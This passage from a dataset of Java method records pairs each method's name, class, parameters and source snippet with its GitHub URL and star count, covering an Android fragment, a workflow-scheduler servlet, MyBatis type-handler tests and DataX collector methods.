"modifiers": ["public"], "return_type": "void", "snippet": "    public void handle(String target, Request baseRequest, HttpServletRequest request, HttpServletResponse response) {\n        var env = Bored.env();\n        if (target.equals(\"/\")) {\n            target = \"/index\" + Bored.env().getSiteConfig().getURLSuffix();\n        }\n        if (Container.contains(target)) {\n            response.setStatus(HttpServletResponse.SC_OK);\n            var html = Container.get(target);\n            if (Objects.isNull(html.content())) {\n                ServletUtil.write(response, html.getInputStream(), html.contentType());\n            } else {\n                ServletUtil.write(response, html.content(), html.contentType());\n            }\n            baseRequest.setHandled(true);\n        }\n    }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/server/handler/URLHandler.java", "stars": "2", "class_props": {"extends": "AbstractHandler", "implements": null, "modifiers": ["public"]}}, {"id": 33983, "method_name": "newInstance", "class_name": "StatusFragment", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "StatusFragment", "snippet": "    public static StatusFragment newInstance() {\n        StatusFragment fragment = new StatusFragment();\n        return fragment;\n    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/status/StatusFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 33984, "method_name": "onCreate", "class_name": "StatusFragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/status/StatusFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 33985, "method_name": "onCreateView", "class_name": "StatusFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        View root = inflater.inflate(R.layout.fragment_status, container, false);\n\n        // Events recyclerView\n        statusRecyclerView = root.findViewById(R.id.eventsRecyclerView);\n        statusRecyclerView.setLayoutManager(new LinearLayoutManager(getContext()));\n        EventsAdapter eventsAdapter = new EventsAdapter(getContext(), EventManager.getInstance().getEvents());\n        statusRecyclerView.setAdapter(eventsAdapter);\n\n        // Set server status\n        serverStatusText = root.findViewById(R.id.serverStatusText);\n        String serverName = IPManager.getInstance().getServerName();\n        serverStatusText.setText(serverName.isEmpty() ? \"Server status\" : serverName);\n\n        // Server online?\n        boolean isOnline = IPManager.getInstance().isOnline();\n        HashMap<Service, Boolean> servicesStatus = IPManager.getInstance().getServicesStatus();\n        isOnline = servicesStatus == null ? false : true;\n\n        // Mongo service status icon\n        mongoStatusImage = root.findViewById(R.id.mongoStatusImage);\n        if (isOnline) {\n            mongoStatusImage.setImageResource(servicesStatus.get(Service.MONGO) ? R.drawable.up : R.drawable.down);\n        } else {\n            mongoStatusImage.setImageResource(R.drawable.offline);\n        }\n\n        // Docker service status icon\n        dockerStatusImage = root.findViewById(R.id.dockerStatusImage);\n        if (isOnline) {\n            dockerStatusImage.setImageResource(servicesStatus.get(Service.DOCKER) ? R.drawable.up : R.drawable.down);\n        } else {\n            dockerStatusImage.setImageResource(R.drawable.offline);\n        }\n\n        return root;\n    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/status/StatusFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 33986, "method_name": "onResume", "class_name": "StatusFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onResume() {\n        super.onResume();\n        statusRecyclerView.setAdapter(new EventsAdapter(getContext(), EventManager.getInstance().getEvents()));\n    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/status/StatusFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 33987, "method_name": "checkedColumnWidth", "class_name": "GridAutofitLayoutManager", "params": ["Context", "int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int checkedColumnWidth(@NonNull final Context context, int columnWidth) {\n        if (columnWidth <= 0) {\n            /* Set default columnWidth value (48dp here). It is better to move this constant\n            to static constant on top, but we need context to convert it to dp, so can't really\n            do so. */\n            columnWidth = (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 48,\n                    context.getResources().getDisplayMetrics());\n        }\n        return columnWidth;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/manager/GridAutofitLayoutManager.java", "stars": "4", "class_props": {"extends": "GridLayoutManager", "implements": null, "modifiers": ["public"]}}, {"id": 33988, "method_name": "setColumnWidth", "class_name": "GridAutofitLayoutManager", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setColumnWidth(final int newColumnWidth) {\n        if (newColumnWidth > 0 && newColumnWidth != columnWidth) {\n            columnWidth = newColumnWidth;\n            isColumnWidthChanged = true;\n        }\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/manager/GridAutofitLayoutManager.java", "stars": "4", "class_props": {"extends": "GridLayoutManager", "implements": null, "modifiers": ["public"]}}, {"id": 33989, "method_name": "onLayoutChildren", "class_name": "GridAutofitLayoutManager", "params": ["RecyclerView", "RecyclerView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onLayoutChildren(@NonNull final RecyclerView.Recycler recycler, @NonNull final RecyclerView.State state) {\n        final int width = getWidth();\n        final int height = getHeight();\n        if (columnWidth > 0 && width > 0 && height > 0 && (isColumnWidthChanged || lastWidth != width || lastHeight != height)) {\n            final int totalSpace;\n            if (getOrientation() == VERTICAL) {\n                totalSpace = width - getPaddingRight() - getPaddingLeft();\n            } else {\n                totalSpace = height - getPaddingTop() - getPaddingBottom();\n            }\n            final int spanCount = Math.max(1, totalSpace / columnWidth);\n            setSpanCount(spanCount);\n            isColumnWidthChanged = false;\n        }\n        lastWidth = width;\n        lastHeight = height;\n        super.onLayoutChildren(recycler, state);\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/manager/GridAutofitLayoutManager.java", "stars": "4", "class_props": {"extends": "GridLayoutManager", "implements": null, "modifiers": ["public"]}}, {"id": 33990, "method_name": "init", "class_name": "FlowTriggerServlet", "params": ["ServletConfig"], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void init(final ServletConfig config) throws ServletException {\n    super.init(config);\n    final AzkabanWebServer server = (AzkabanWebServer) getApplication();\n    this.scheduler = server.getScheduler();\n    this.projectManager = server.getProjectManager();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 33991, "method_name": "handleGet", "class_name": "FlowTriggerServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void handleGet(final HttpServletRequest req, final HttpServletResponse resp,\n      final Session session) throws ServletException, IOException {\n    if (hasParam(req, \"ajax\")) {\n      handleAJAXAction(req, resp, session);\n    } else {\n      handlePage(req, resp, session);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 33992, "method_name": "ajaxFetchTrigger", "class_name": "FlowTriggerServlet", "params": ["int", "String", "Session", "HashMap<String,Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void ajaxFetchTrigger(final int projectId, final String flowId, final Session session,\n      final HashMap<String,\n          Object> ret) {\n    final ScheduledFlowTrigger res = this.scheduler\n        .getScheduledFlowTriggerJobs().stream().filter(\n            scheduledFlowTrigger -> scheduledFlowTrigger.getFlowId().equals(flowId)\n                && scheduledFlowTrigger.getProjectId\n                () == projectId).findFirst().orElse(null);\n\n    if (res != null) {\n      final Map<String, Object> jsonObj = new HashMap<>();\n      jsonObj.put(\"cronExpression\", res.getFlowTrigger().getSchedule().getCronExpression());\n      jsonObj.put(\"submitUser\", res.getSubmitUser());\n      jsonObj.put(\"firstSchedTime\",\n          utils.formatDateTime(res.getQuartzTrigger().getStartTime().getTime()));\n      jsonObj.put(\"nextExecTime\",\n          utils.formatDateTime(res.getQuartzTrigger().getNextFireTime().getTime()));\n\n      Long maxWaitMin = null;\n      if (res.getFlowTrigger().getMaxWaitDuration().isPresent()) {\n        maxWaitMin = res.getFlowTrigger().getMaxWaitDuration().get().toMinutes();\n      }\n      jsonObj.put(\"maxWaitMin\", maxWaitMin);\n\n      if (!res.getFlowTrigger().getDependencies().isEmpty()) {\n        jsonObj.put(\"dependencies\", res.getDependencyListJson());\n      }\n      ret.put(\"flowTrigger\", jsonObj);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 33993, "method_name": "checkProjectIdAndFlowId", "class_name": "FlowTriggerServlet", "params": ["HttpServletRequest"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean checkProjectIdAndFlowId(final HttpServletRequest req) {\n    return hasParam(req, \"projectId\") && hasParam(req, \"flowId\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 33994, "method_name": "handleAJAXAction", "class_name": "FlowTriggerServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleAJAXAction(final HttpServletRequest req,\n      final HttpServletResponse resp, final Session session) throws ServletException,\n      IOException {\n    final HashMap<String, Object> ret = new HashMap<>();\n    final String ajaxName = getParam(req, \"ajax\");\n    if (ajaxName.equals(\"fetchTrigger\")) {\n      if (checkProjectIdAndFlowId(req)) {\n        final int projectId = getIntParam(req, \"projectId\");\n        final String flowId = getParam(req, \"flowId\");\n        ajaxFetchTrigger(projectId, flowId, session, ret);\n      }\n    } else if (ajaxName.equals(\"pauseTrigger\") || ajaxName.equals(\"resumeTrigger\")) {\n      if (checkProjectIdAndFlowId(req)) {\n        final int projectId = getIntParam(req, \"projectId\");\n        final String flowId = getParam(req, \"flowId\");\n        final Project project = this.projectManager.getProject(projectId);\n\n        if (project == null) {\n          ret.put(\"error\", \"please specify a valid project id\");\n        } else if (!hasPermission(project, session.getUser(), Type.ADMIN)) {\n          ret.put(\"error\", \"Permission denied. Need ADMIN access.\");\n        } else {\n          try {\n            if (ajaxName.equals(\"pauseTrigger\")) {\n              this.scheduler.pauseFlowTrigger(projectId, flowId);\n            } else {\n              this.scheduler.resumeFlowTrigger(projectId, flowId);\n            }\n            ret.put(\"status\", \"success\");\n          } catch (final SchedulerException ex) {\n            ret.put(\"error\", ex.getMessage());\n          }\n        }\n      }\n    }\n    if (ret != null) {\n      this.writeJSON(resp, ret);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 33995, "method_name": "handlePage", "class_name": "FlowTriggerServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void handlePage(final HttpServletRequest req,\n      final HttpServletResponse resp, final Session session) {\n    final Page page =\n        newPage(req, resp, session,\n            \"azkaban/webapp/servlet/velocity/flowtriggerspage.vm\");\n\n    page.add(\"flowTriggers\", this.scheduler.getScheduledFlowTriggerJobs());\n    String languageType = LoadJsonUtils.getLanguageType();\n    page.add(\"currentlangType\", languageType);\n    page.render();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 33996, "method_name": "handlePost", "class_name": "FlowTriggerServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void handlePost(final HttpServletRequest req, final HttpServletResponse resp,\n      final Session session) throws ServletException, IOException {\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 33997, "method_name": "shouldSetParameter", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldSetParameter() throws Exception {\n    TYPE_HANDLER.setParameter(ps, 1, \"Hello\", null);\n    verify(ps).setString(1, \"Hello\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 33998, "method_name": "shouldGetResultFromResultSetByName", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByName() throws Exception {\n    when(rs.getMetaData()).thenReturn(rsmd);\n    when(rsmd.getColumnCount()).thenReturn(1);\n    when(rsmd.getColumnLabel(1)).thenReturn(\"column\");\n    when(rsmd.getColumnClassName(1)).thenReturn(String.class.getName());\n    when(rsmd.getColumnType(1)).thenReturn(JdbcType.VARCHAR.TYPE_CODE);\n    when(rs.getString(\"column\")).thenReturn(\"Hello\");\n    assertEquals(\"Hello\", TYPE_HANDLER.getResult(rs, \"column\"));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 33999, "method_name": "shouldGetResultNullFromResultSetByName", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByName() throws Exception {\n    // Unnecessary\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 34000, "method_name": "shouldGetResultFromResultSetByPosition", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByPosition() throws Exception {\n    when(rs.getMetaData()).thenReturn(rsmd);\n    when(rsmd.getColumnClassName(1)).thenReturn(String.class.getName());\n    when(rsmd.getColumnType(1)).thenReturn(JdbcType.VARCHAR.TYPE_CODE);\n    when(rs.getString(1)).thenReturn(\"Hello\");\n    assertEquals(\"Hello\", TYPE_HANDLER.getResult(rs, 1));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 34001, "method_name": "shouldGetResultNullFromResultSetByPosition", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByPosition() throws Exception {\n    // Unnecessary\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 34002, "method_name": "shouldGetResultFromCallableStatement", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromCallableStatement() throws Exception {\n    when(cs.getObject(1)).thenReturn(\"Hello\");\n    assertEquals(\"Hello\", TYPE_HANDLER.getResult(cs, 1));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 34003, "method_name": "shouldGetResultNullFromCallableStatement", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromCallableStatement() throws Exception {\n    when(cs.getObject(1)).thenReturn(null);\n    assertNull(TYPE_HANDLER.getResult(cs, 1));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 34004, "method_name": "setParameterWithNullParameter", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void setParameterWithNullParameter() throws Exception {\n    TYPE_HANDLER.setParameter(ps, 0, null, JdbcType.INTEGER);\n    verify(ps).setNull(0, JdbcType.INTEGER.TYPE_CODE);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 34005, "method_name": "setParameterWithNullParameterThrowsException", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["SQLException"], "modifiers": [], "return_type": "void", "snippet": "  void setParameterWithNullParameterThrowsException() throws SQLException {\n    doThrow(new SQLException(\"invalid column\")).when(ps).setNull(1, JdbcType.INTEGER.TYPE_CODE);\n    try {\n      TYPE_HANDLER.setParameter(ps, 1, null, JdbcType.INTEGER);\n      Assertions.fail(\"Should have thrown a TypeException\");\n    } catch (Exception e) {\n      Assertions.assertTrue(e instanceof TypeException, \"Expected TypedException\");\n      Assertions.assertTrue(e.getMessage().contains(\"parameter #1\"), \"Parameter index is in exception\");\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 34006, "method_name": "setParameterWithNonNullParameterThrowsException", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["SQLException"], "modifiers": [], "return_type": "void", "snippet": "  void setParameterWithNonNullParameterThrowsException() throws SQLException {\n    doThrow(new SQLException(\"invalid column\")).when((UnknownTypeHandler) TYPE_HANDLER).setNonNullParameter(ps, 1, 99, JdbcType.INTEGER);\n    try {\n      TYPE_HANDLER.setParameter(ps, 1, 99, JdbcType.INTEGER);\n      Assertions.fail(\"Should have thrown a TypeException\");\n    } catch (Exception e) {\n      Assertions.assertTrue(e instanceof TypeException, \"Expected TypedException\");\n      Assertions.assertTrue(e.getMessage().contains(\"parameter #1\"), \"Parameter index is in exception\");\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 34007, "method_name": "getResultWithResultSetAndColumnNameThrowsException", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["SQLException"], "modifiers": [], "return_type": "void", "snippet": "  void getResultWithResultSetAndColumnNameThrowsException() throws SQLException {\n    doThrow(new SQLException(\"invalid column\")).when((UnknownTypeHandler) TYPE_HANDLER).getNullableResult(rs, \"foo\");\n    try {\n      TYPE_HANDLER.getResult(rs, \"foo\");\n      Assertions.fail(\"Should have thrown a ResultMapException\");\n    } catch (Exception e) {\n      Assertions.assertTrue(e instanceof ResultMapException, \"Expected ResultMapException\");\n      Assertions.assertTrue(e.getMessage().contains(\"column 'foo'\"), \"column name is not in exception\");\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 34008, "method_name": "getResultWithResultSetAndColumnIndexThrowsException", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["SQLException"], "modifiers": [], "return_type": "void", "snippet": "  void getResultWithResultSetAndColumnIndexThrowsException() throws SQLException {\n    doThrow(new SQLException(\"invalid column\")).when((UnknownTypeHandler) TYPE_HANDLER).getNullableResult(rs, 1);\n    try {\n      TYPE_HANDLER.getResult(rs, 1);\n      Assertions.fail(\"Should have thrown a ResultMapException\");\n    } catch (Exception e) {\n      Assertions.assertTrue(e instanceof ResultMapException, \"Expected ResultMapException\");\n      Assertions.assertTrue(e.getMessage().contains(\"column #1\"), \"column index is not in exception\");\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 34009, "method_name": "getResultWithCallableStatementAndColumnIndexThrowsException", "class_name": "UnknownTypeHandlerTest", "params": [], "throws": ["SQLException"], "modifiers": [], "return_type": "void", "snippet": "  void getResultWithCallableStatementAndColumnIndexThrowsException() throws SQLException {\n    doThrow(new SQLException(\"invalid column\")).when((UnknownTypeHandler) TYPE_HANDLER).getNullableResult(cs, 1);\n    try {\n      TYPE_HANDLER.getResult(cs, 1);\n      Assertions.fail(\"Should have thrown a ResultMapException\");\n    } catch (Exception e) {\n      Assertions.assertTrue(e instanceof ResultMapException, \"Expected ResultMapException\");\n      Assertions.assertTrue(e.getMessage().contains(\"column #1\"), \"column index is not in exception\");\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/UnknownTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 34010, "method_name": "getTaskCommunicationMap", "class_name": "AbstractCollector", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<Integer,Communication>", "snippet": "    public Map<Integer, Communication> getTaskCommunicationMap() {\n        return taskCommunicationMap;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/collector/AbstractCollector.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34011, "method_name": "getJobId", "class_name": "AbstractCollector", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getJobId() {\n        return jobId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/collector/AbstractCollector.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34012, "method_name": "setJobId", "class_name": "AbstractCollector", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setJobId(Long jobId) {\n        this.jobId = jobId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/collector/AbstractCollector.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34013, "method_name": "registerTGCommunication", "class_name": "AbstractCollector", "params": ["List<Configuration>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void registerTGCommunication(List<Configuration> taskGroupConfigurationList) {\n        for (Configuration config : taskGroupConfigurationList) {\n            int taskGroupId = config.getInt(\n                    CoreConstant.DATAX_CORE_CONTAINER_TASKGROUP_ID);\n            LocalTGCommunicationManager.registerTaskGroupCommunication(taskGroupId, new Communication());\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/collector/AbstractCollector.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34014, "method_name": "registerTaskCommunication", "class_name": "AbstractCollector", "params": ["List<Configuration>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void registerTaskCommunication(List<Configuration> taskConfigurationList) {\n        for (Configuration taskConfig : taskConfigurationList) {\n            int taskId = taskConfig.getInt(CoreConstant.TASK_ID);\n            Communication taskCommunication = new Communication();\n            taskCommunication.setLongCounter(TASK_RUNNING_WRITERS, taskConfig.getList(CoreConstant.JOB_WRITER).size());\n            this.taskCommunicationMap.put(taskId, taskCommunication);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/collector/AbstractCollector.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34015, "method_name": "collectFromTask", "class_name": "AbstractCollector", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Communication", "snippet": "    public Communication collectFromTask() {\n        Communication communication = new Communication();\n        communication.setState(State.SUCCEEDED);\n\n        for (Communication taskCommunication :\n                this.taskCommunicationMap.values()) {\n            communication.mergeFrom(taskCommunication);\n        }\n\n        return communication;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/collector/AbstractCollector.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34016, "method_name": "collectFromTaskGroup", "class_name": "AbstractCollector", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "Communication", "snippet": "    public abstract Communication collectFromTaskGroup();\n\n    public Map<Integer, Communication> getTGCommunicationMap() {\n        return LocalTGCommunicationManager.getTaskGroupCommunicationMap();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/collector/AbstractCollector.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34017, "method_name": "getTGCommunicationMap", "class_name": "AbstractCollector", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<Integer,Communication>", "snippet": "    public Map<Integer, Communication> getTGCommunicationMap() {\n        return LocalTGCommunicationManager.getTaskGroupCommunicationMap();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/collector/AbstractCollector.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34018, "method_name": "getTGCommunication", "class_name": "AbstractCollector", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Communication", "snippet": "    public Communication getTGCommunication(Integer taskGroupId) {\n        return LocalTGCommunicationManager.getTaskGroupCommunication(taskGroupId);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/collector/AbstractCollector.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34019, "method_name": "getTaskCommunication", "class_name": "AbstractCollector", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Communication", "snippet": "    public Communication getTaskCommunication(Integer taskId) {\n        return this.taskCommunicationMap.get(taskId);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/collector/AbstractCollector.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34020, "method_name": "parseJSONObject", "class_name": "JSONParser", "params": ["TokenList"], "throws": null, "modifiers": ["public"], "return_type": "JSONObject", "snippet": "    public JSONObject parseJSONObject(@NotNull TokenList tokens) {\n        if (tokens.next().type() != BEGIN_OBJECT) {\n            throw new JSONParseException(\"Parse error, invalid Token.\");\n        }\n\n        JSONObject JSONObject = new JSONObject();\n        int expectToken = TokenType.calcCode(STRING, END_OBJECT);\n        String key = null;\n        Object value;\n        while (tokens.hasMore()) {\n            Token token = tokens.next();\n            TokenType tokenType = token.type();\n            String tokenValue = token.value();\n            switch (tokenType) {\n                case BEGIN_OBJECT:\n                    